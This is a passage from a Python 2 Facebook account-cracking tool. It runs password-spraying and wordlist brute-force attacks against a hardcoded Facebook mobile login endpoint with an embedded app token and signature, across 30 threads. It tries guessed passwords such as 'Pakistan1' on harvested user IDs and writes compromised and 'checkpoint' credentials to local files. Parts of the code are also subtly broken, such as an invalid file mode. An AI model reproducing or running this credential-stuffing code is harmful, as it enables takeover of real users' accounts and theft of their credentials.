                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                s = json.load(data)
                                if 'access_token' in s:
                                    print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in s['error_msg']:
                                    print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass6
                                    cek = open('out/checkpoint.txt', 'k')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = 'Pakistan1'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    s = json.load(data)
                                    if 'access_token' in s:
                                        print '\x1b[1;97mLive\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in s['error_msg']:
                                        print '\x1b[1;97mError\x1b[1;97m \x1b[1;97m\x1b[1;97m ' + user + ' \x1b[1;97m\x1b[1;97m ' + pass7
                                        cek = open('out/checkpoint.txt', 'k')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4\xe2\x96\xa4'
    print '  Written By HACKER'
    print '\x1b[1;97mProcess Has Been Completed \x1b[1;97m....'
    print '\x1b[1;97mType (python2 Dvl.py) New Fb Start Cloning\x1b[1;97m....'
    print '\x1b[1;97mTotal Live/\x1b[1;97mCheckpoint \x1b[1;97m: \x1b[1;97m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;97m' + str(len(cekpoint))
    print 'LOGIN ERROR ID AFTER 2 WEEKS (14DAYS)\n\n'
    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
    crack()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo
        print '-----------------------------------------------------------'
        try:
            email = raw_input('\x1b[1;97mID\x1b[1;97m/\x1b[1;97mEmail \x1b[1;97mTarget \x1b[1;97m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;97mWordlist \x1b[1;97m(Type--> dvl.list) \x1b[1;97m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '------------------------------------------------------------'
            print '\x1b[1;97m[\x1b[1;97m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mTarget \x1b[1;97m:\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;97mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;97mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;97m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;97m] \x1b[1;97mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' \xe2\x97\x8f ' + pw + '\n')
                        dapat.close()
                        print '\x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                    elif 'www.facebook.com' in mpsh['error_msg']:
                        ceks = open('Brutecekpoint.txt', 'w')
                        ceks.write(email + ' | ' + pw + '\n')
                        ceks.close()
                        print '\x1b[1;92mFounded.'
                        print '--------------------------------------------------'
                        print '\x1b[1;91m[!] \x1b[1;97mAccount Maybe Checkpoint'
                        time.sleep(0.05)
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;97m ' + email
                        time.sleep(0.05)
                        print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;97mPassword \x1b[1;97m:\x1b[1;97m ' + pw
                        keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print '\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect '
            super()


def tokenz():
    os.system('clear')
    print logo
    toket = raw_input('\x1b[1;97m[?] \x1b[1;97mToken\x1b[1;97m : Enter Acces Token Here :- ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong'
        e = raw_input('\x1b[1;97m[?] \x1b[1;97mToken Invalid Refresh Page\x1b[1;97m[y/n]: ')
        if e == '':
            keluar()
        elif e == 'y':
            login()
        else:
            keluar()


def get(data):
    print 'Generate access token '
    try:
        os.mkdir('cookie')
    except OSError:
        pass

    b = open('cookie/token.log', 'w')
    try:
        r = requests.get('https://api.facebook.com/restserver.php', params=data)
        a = json.loads(r.text)
        b.write(a['access_token'])
        b.close()
        print 'successfully generate access token'
        print 'Your access token is stored in cookie/token.log'
        menu()
    except KeyError:
        print 'Failed to generate access token'
        print 'Check your connection / email or password'
        os.remove('cookie/token.log')
        menu()
    except requests.exceptions.ConnectionError:
        print 'Failed to generate access token'
        print 'Connection error !!!'
        os.remove('cookie/token.log')
        menu()


if __name__ == '__main__':
    login()